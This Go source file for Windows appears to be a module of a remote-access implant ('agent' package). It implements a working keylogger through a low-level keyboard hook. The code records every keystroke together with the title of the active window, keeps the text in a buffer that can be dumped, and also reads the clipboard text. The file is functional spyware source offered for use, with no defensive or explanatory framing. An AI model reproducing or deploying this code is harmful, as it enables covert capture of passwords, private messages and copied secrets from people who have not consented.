//go:build windows

package agent

import (
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32kl                  = windows.NewLazySystemDLL("user32.dll")
	procSetWindowsHookExW     = user32kl.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx   = user32kl.NewProc("UnhookWindowsHookEx")
	procCallNextHookEx        = user32kl.NewProc("CallNextHookEx")
	procPeekMessageW          = user32kl.NewProc("PeekMessageW")
	procTranslateMessage      = user32kl.NewProc("TranslateMessage")
	procDispatchMessageW      = user32kl.NewProc("DispatchMessageW")
	procToUnicode             = user32kl.NewProc("ToUnicode")
	procGetForegroundWindowKL = user32kl.NewProc("GetForegroundWindow")
	procGetWindowTextW        = user32kl.NewProc("GetWindowTextW")
	procOpenClipboardKL       = user32kl.NewProc("OpenClipboard")
	procCloseClipboardKL      = user32kl.NewProc("CloseClipboard")
	procGetClipboardData      = user32kl.NewProc("GetClipboardData")
	procGlobalLock            = kernel32.NewProc("GlobalLock")
	procGlobalUnlock          = kernel32.NewProc("GlobalUnlock")
)

const (
	whKeyboardLL  = 13
	wmKeydown     = 0x0100
	wmKeyup       = 0x0101
	wmSyskeydown  = 0x0104
	wmSyskeyup    = 0x0105
	hcAction      = 0
	pmRemove      = 0x0001
	cfUnicodeText = 13
)

type kbdllHookStruct struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

// msgBuf is the Windows MSG structure (48 bytes on x64).
type msgBuf [48]byte

var (
	keylogMu       sync.Mutex
	keylogBuf      strings.Builder
	keylogHook     uintptr
	keylogActive   bool
	keylogStopCh   chan struct{}
	keylogCB       uintptr
	keylogModState [256]byte // synthetic keyboard state — cross-session safe
	keylogLastWin  string   // last window title, for context tagging
)

// vkLabel maps virtual keys that don't produce printable chars to display tags.
var vkLabel = map[uint32]string{
	0x08: "[BS]", 0x09: "\t", 0x0D: "\n",
	0x1B: "[ESC]",
	0x20: " ",
	0x21: "[PGUP]", 0x22: "[PGDN]", 0x23: "[END]", 0x24: "[HOME]",
	0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]",
	0x2E: "[DEL]", 0x2D: "[INS]",
	0x70: "[F1]", 0x71: "[F2]", 0x72: "[F3]", 0x73: "[F4]",
	0x74: "[F5]", 0x75: "[F6]", 0x76: "[F7]", 0x77: "[F8]",
	0x78: "[F9]", 0x79: "[F10]", 0x7A: "[F11]", 0x7B: "[F12]",
}

// modifierVK returns true if the VK code is a modifier key.
func modifierVK(vk uint32) bool {
	switch vk {
	case 0x10, 0xA0, 0xA1, // SHIFT, LSHIFT, RSHIFT
		0x11, 0xA2, 0xA3, // CTRL, LCTRL, RCTRL
		0x12, 0xA4, 0xA5, // ALT, LALT, RALT
		0x5B, 0x5C,       // LWIN, RWIN
		0x14, 0x90, 0x91: // CAPSLOCK, NUMLOCK, SCROLLLOCK
		return true
	}
	return false
}

// updateModState updates our synthetic keyboard state from hook events.
func updateModState(vk uint32, down bool) {
	set := func(keys ...uint32) {
		for _, k := range keys {
			if down {
				keylogModState[k] = 0x80
			} else {
				keylogModState[k] = 0
			}
		}
	}
	switch vk {
	case 0x10, 0xA0, 0xA1:
		set(0x10, 0xA0, 0xA1)
	case 0x11, 0xA2, 0xA3:
		set(0x11, 0xA2, 0xA3)
	case 0x12, 0xA4, 0xA5:
		set(0x12, 0xA4, 0xA5)
	case 0x5B:
		set(0x5B)
	case 0x5C:
		set(0x5C)
	case 0x14: // CAPSLOCK — toggle on keydown only
		if down {
			if keylogModState[0x14] == 0x01 {
				keylogModState[0x14] = 0x00
			} else {
				keylogModState[0x14] = 0x01
			}
		}
	case 0x90: // NUMLOCK — toggle
		if down {
			if keylogModState[0x90] == 0x01 {
				keylogModState[0x90] = 0x00
			} else {
				keylogModState[0x90] = 0x01
			}
		}
	}
}

func getWindowTitle() string {
	hwnd, _, _ := procGetForegroundWindowKL.Call()
	if hwnd == 0 {
		return ""
	}
	buf := make([]uint16, 256)
	procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 256)
	return windows.UTF16ToString(buf)
}

func startKeylog() (string, error) {
	keylogMu.Lock()
	defer keylogMu.Unlock()
	if keylogActive {
		return "", fmt.Errorf("keylogger already running")
	}
	keylogBuf.Reset()
	keylogStopCh = make(chan struct{})
	keylogActive = true
	keylogLastWin = ""
	// Initialise NUMLOCK as on by default (common state).
	keylogModState[0x90] = 0x01

	keylogCB = syscall.NewCallback(func(nCode int32, wParam, lParam uintptr) uintptr {
		if nCode >= hcAction {
			hs := (*kbdllHookStruct)(unsafe.Pointer(lParam))
			isDown := wParam == wmKeydown || wParam == wmSyskeydown

			// Always update modifier tracking for both up and down.
			if modifierVK(hs.VkCode) {
				keylogMu.Lock()
				updateModState(hs.VkCode, isDown)
				keylogMu.Unlock()
			} else if isDown {
				keylogMu.Lock()

				// Window title context.
				if win := getWindowTitle(); win != "" && win != keylogLastWin {
					keylogLastWin = win
					fmt.Fprintf(&keylogBuf, "\n[Window: %s]\n", win)
				}

				// Try ToUnicode with our synthetic key state.
				// Flag 0x4 prevents modification of internal dead-key state.
				var buf [8]uint16
				n, _, _ := procToUnicode.Call(
					uintptr(hs.VkCode), uintptr(hs.ScanCode),
					uintptr(unsafe.Pointer(&keylogModState[0])),
					uintptr(unsafe.Pointer(&buf[0])),
					7, 4,
				)
				if int32(n) > 0 {
					ch := windows.UTF16ToString(buf[:int32(n)])
					// Replace bare \r with \n for readability.
					ch = strings.ReplaceAll(ch, "\r", "\n")
					keylogBuf.WriteString(ch)
				} else if label, ok := vkLabel[hs.VkCode]; ok {
					keylogBuf.WriteString(label)
				}
				// Modifier-only or unknown keys are silently dropped.
				keylogMu.Unlock()
			}
		}
		r, _, _ := procCallNextHookEx.Call(keylogHook, uintptr(nCode), wParam, lParam)
		return r
	})

	go func() {
		h, _, _ := procSetWindowsHookExW.Call(whKeyboardLL, keylogCB, 0, 0)
		keylogMu.Lock()
		if h == 0 {
			keylogActive = false
			keylogMu.Unlock()
			return
		}
		keylogHook = h
		keylogMu.Unlock()

		var msg msgBuf
		ticker := time.NewTicker(10 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-keylogStopCh:
				procUnhookWindowsHookEx.Call(keylogHook)
				keylogMu.Lock()
				keylogActive = false
				keylogHook = 0
				keylogMu.Unlock()
				return
			case <-ticker.C:
				for {
					r, _, _ := procPeekMessageW.Call(
						uintptr(unsafe.Pointer(&msg[0])), 0, 0, 0, pmRemove)
					if r == 0 {
						break
					}
					procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg[0])))
					procDispatchMessageW.Call(uintptr(unsafe.Pointer(&msg[0])))
				}
			}
		}
	}()
	return "[+] keylogger started", nil
}

func stopKeylog() (string, error) {
	keylogMu.Lock()
	active := keylogActive
	keylogMu.Unlock()
	if !active {
		return "", fmt.Errorf("keylogger not running")
	}
	close(keylogStopCh)
	return "[+] keylogger stopped", nil
}

func dumpKeylog() string {
	keylogMu.Lock()
	defer keylogMu.Unlock()
	out := keylogBuf.String()
	keylogBuf.Reset()
	return out
}

// ── clipboard ────────────────────────────────────────────────────────────────

func getClipboard() (string, error) {
	r, _, err := procOpenClipboardKL.Call(0)
	if r == 0 {
		return "", fmt.Errorf("OpenClipboard: %w", err)
	}
	defer procCloseClipboardKL.Call()

	h, _, _ := procGetClipboardData.Call(cfUnicodeText)
	if h == 0 {
		return "", fmt.Errorf("clipboard empty or non-text")
	}
	ptr, _, _ := procGlobalLock.Call(h)
	if ptr == 0 {
		return "", fmt.Errorf("GlobalLock failed")
	}
	defer procGlobalUnlock.Call(h)

	var chars []uint16
	for i := uintptr(0); ; i++ {
		c := *(*uint16)(unsafe.Pointer(ptr + i*2))
		if c == 0 {
			break
		}
		chars = append(chars, c)
	}
	return windows.UTF16ToString(chars), nil
}
